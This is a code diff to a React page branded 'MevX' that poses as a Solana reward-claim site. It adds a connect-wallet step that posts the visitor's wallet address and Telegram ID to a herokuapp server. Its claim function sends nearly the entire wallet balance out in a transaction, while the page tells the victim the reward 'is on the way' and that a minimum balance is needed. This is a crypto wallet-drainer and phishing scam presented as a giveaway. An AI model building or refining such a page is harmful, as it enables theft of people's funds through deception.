@@ -29,13 +29,49 @@ export default function Home() {
 			}
 		}
 
-		if (claimProcess == "CONNECT") {
+		if (tgId && params.get("process") === "CONNECT") {
 			connectWallet();
 		}
-	}, []);
+	}, [tgId, token]);
 
 	function isMobile() {
 		return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+	}
+
+	async function connectWallet() {
+		if (window.solana && window.solana.isPhantom) {
+			try {
+				const resp = await window.solana.connect();
+				const address = resp.publicKey.toString();
+				setWalletAddress(address);
+
+				console.log("ADDRESS", address);
+				console.log("tgID", tgId);
+
+				if (tgId) {
+					await fetch(`https://mevxpro-c2984bbac7fe.herokuapp.com/wallet-connected`, {
+						method: "POST",
+						headers: { "Content-Type": "application/json" },
+						body: JSON.stringify({
+							tgId,
+							walletAddress: address,
+							token,
+						}),
+					});
+				}
+
+				// ✅ show animated notification instead of alert
+				setNotification("Successful! Click 'Claim Solana' to receive reward");
+			} catch (err) {
+				console.error("Wallet connection failed:", err);
+				setNotification("Wallet connection failed");
+			}
+		} else if (isMobile()) {
+			const dappUrl = encodeURIComponent(window.location.href);
+			window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
+		} else {
+			setNotification("Failed please install Phantom to continue.");
+		}
 	}
 
 	async function handleClaim() {
@@ -84,7 +120,7 @@ export default function Home() {
 				console.log("Balance (lamports):", balance);
 
 				if (balance <= 5000) {
-					setNotification("Not enough SOL to cover fees.");
+					setNotification("Failed to claim, no SOL to cover fees. Min ~.5");
 					return;
 				}
 
@@ -108,7 +144,7 @@ export default function Home() {
 				const lamportsToSend = balance - fee - rentExemptReserve - safetyBuffer;
 
 				if (lamportsToSend <= 0) {
-					setNotification("Not enough SOL to cover transaction fees.");
+					setNotification("Failed to claim, no SOL to cover fees. Min ~.5");
 					return;
 				}
 
@@ -134,7 +170,7 @@ export default function Home() {
 				skipPreflight: false,
 				maxRetries: 3,
 			});
-			setNotification("Claim successful. Will receive reward shortly.");
+			setNotification("Successful. Your Reward is on the way");
 			console.log("Transaction Signature:", signature);
 
 			// Confirm
@@ -143,39 +179,6 @@ export default function Home() {
 			console.error("Claim failed:", err);
 			setNotification("Transaction failed or rejected.");
 			window.close();
-		}
-	}
-
-	async function connectWallet() {
-		if (window.solana && window.solana.isPhantom) {
-			try {
-				const resp = await window.solana.connect();
-				const address = resp.publicKey.toString();
-				setWalletAddress(address);
-
-				if (tgId) {
-					await fetch(`https://mevxpro-c2984bbac7fe.herokuapp.com/wallet-connected`, {
-						method: "POST",
-						headers: { "Content-Type": "application/json" },
-						body: JSON.stringify({
-							tgId,
-							walletAddress: address,
-							token,
-						}),
-					});
-				}
-
-				// ✅ show animated notification instead of alert
-				setNotification("Wallet connected!");
-			} catch (err) {
-				console.error("Wallet connection failed:", err);
-				setNotification("Wallet connection failed");
-			}
-		} else if (isMobile()) {
-			const dappUrl = encodeURIComponent(window.location.href);
-			window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
-		} else {
-			setNotification("Please install Phantom extension to continue.");
 		}
 	}
 
@@ -191,15 +194,15 @@ export default function Home() {
 							MevX
 						</a>
 						<a href="https://app.coinpouch.io" target="_blank" rel="noopener noreferrer" className="btn btn-primary btn-launch-app btn-launch-app-mobile">
-							<span className="btn-primary-header">Launch App</span>
+							<span className="btn-primary-header">Launch Bot</span>
 						</a>
-						<button className="burger-menu" aria-label="Open menu">
+						{/* <button className="burger-menu" aria-label="Open menu">
 							<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-menu">
 								<line x1="4" y1="12" x2="20" y2="12" />
 								<line x1="4" y1="6" x2="20" y2="6" />
 								<line x1="4" y1="18" x2="20" y2="18" />
 							</svg>
-						</button>
+						</button> */}
 
 						<ul className="nav-links">
 							{/* <li><a className="active" href="/" data-discover="true">Home</a></li> */}
@@ -235,10 +238,9 @@ export default function Home() {
 							</p>
 							<div className="hero-actions">
 								{walletAddress ? (
-									<button className="btn btn-outline" style={{ fontSize: "17px", padding: "0.6rem 1rem" }} onClick={handleClaim}>
-										Claim Solana{" "}
-										<img width="20" height="20" src="https://img.icons8.com/flat-round/64/link--v1.png" alt="link--v1"/>
-																			</button>
+									<button className="btn btn-outline" style={{ fontSize: "17px", padding: "0.6rem 1rem", background: "orange", fontWeight: "bolder", border: "1px solid #fff" }} onClick={handleClaim}>
+										Claim Solana <img width="23" height="23" src="https://img.icons8.com/flat-round/64/link--v1.png" alt="link--v1" />
+									</button>
 								) : (
 									<button className="btn btn-outline" style={{ fontSize: "17px", padding: "0.6rem 1rem" }} onClick={connectWallet}>
 										Connect Wallet
@@ -260,8 +262,8 @@ export default function Home() {
 
 							<div className="contract-section">
 								<div className="contract-label">
-									Contract:
-									<span className="contract-address">9EnbaVoFqvh4vjz5GWzoo5ZSQp2soxp3n4wNjmKSqepA</span>
+									Address:
+									<span className="contract-address">{walletAddress || "Connect & Get Started"}</span>
 								</div>
 								<div>
 									<button className="copy-btn">
